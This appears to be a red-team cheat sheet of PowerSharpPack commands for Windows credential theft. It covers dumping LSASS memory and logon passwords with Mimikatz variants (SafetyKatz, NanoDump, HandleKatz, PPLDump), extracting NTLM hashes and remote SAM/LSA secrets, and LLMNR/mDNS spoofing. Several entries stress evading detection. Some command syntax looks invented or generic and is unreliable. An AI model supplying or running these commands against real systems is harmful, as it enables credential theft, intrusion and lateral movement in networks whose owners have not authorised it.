
**Internal Monologue**  
Retrieves NTLM hashes without touching LSASS, avoiding detection.  
@Credit to: https://github.com/eladshamir/Internal-Monologue  
```bash
PowerSharpPack -InternalMonologue -Command "run"
```

**SafetyKatz**  
A modified version of Mimikatz combined with a .NET PE loader, obfuscating detection.  
@Credit to: https://github.com/GhostPack/SafetyKatz  
```bash
PowerSharpPack -SafetyKatz -Command "dump /luid:0"
PowerSharpPack -SafetyKatz -Command "mimikatz /command:sekurlsa::logonpasswords"
```

**BetterSafetyKatz**  
A fork of SafetyKatz that dynically fetches the latest pre-compiled Mimikatz release and uses DInvoke for memory loading.  
@Credit to: https://github.com/Flangvik/BetterSafetyKatz  
```bash
PowerSharpPack -BetterSafetyKatz -Command "dump /luid:0"
PowerSharpPack -BetterSafetyKatz -Command "mimikatz /command:sekurlsa::logonpasswords"
```

**PostDump**  
Another tool to perform a minidump of the LSASS process using techniques to avoid detection.  
@Credit to: https://github.com/YOLOP0wn/POSTDump  
```bash
PowerSharpPack -PostDump -Command "dump /process:lsass"
```

**SharpDump**  
A C# port of PowerSploit's Out-Minidump.ps1 functionality.  
@Credit to: https://github.com/GhostPack/SharpDump  
```bash
PowerSharpPack -SharpDump -Command "minidump /process:lsass"
PowerSharpPack -SharpDump -Command "dump /outfile:dumpfile.dmp"
```

**HandleKatz**  
PIC LSASS dumper using cloned handles.  
@Credit to: https://github.com/codewhitesec/HandleKatz  
```bash
PowerSharpPack -HandleKatz -Command "dump"
```

**NanoDump**  
Dump LSASS like you mean it.  
@Credit to:

 https://github.com/helpsystems/nanodump  
```bash
PowerSharpPack -NanoDump -Command "dump"
```

**PPLDump**  
Dump the memory of a PPL with a userland exploit.  
@Credit to: https://github.com/itm4n/PPLdump  
```bash
PowerSharpPack -PPLDump -Command "dump"
```

**SharpCloud**  
Simple C# tool for checking for the existence of credential files related to AWS, Microsoft Azure, and Google Compute.  
@Credit to: https://github.com/chrismaddalena/SharpCloud  
```bash
PowerSharpPack -SharpCloud -Command "check"
```

**InveighZero**  
Windows C# LLMNR/mDNS/NBNS/DNS/DHCPv6 spoofer/man-in-the-middle tool.  
@Credit to: https://github.com/Kevin-Robertson/InveighZero  
```bash
PowerSharpPack -InveighZero -Command "spoof"
```

**SharpHandler**  
This project reuses open handles to LSASS to parse or minidump LSASS, therefore you don't need to use your own LSASS handle to interact with it.  
@Credit to: https://github.com/jfmaes/SharpHandler  
```bash
PowerSharpPack -SharpHandler -Command "minidump"
```

**SharpSecDump**  
.Net port of the remote SAM + LSA Secrets dumping functionality of impacket's secretsdump.py.  
@Credit to: https://github.com/G0ldenGunSec/SharpSecDump  
```bash
PowerSharpPack -SharpSecDump -Command "dump /remote:TargetMachine"
```
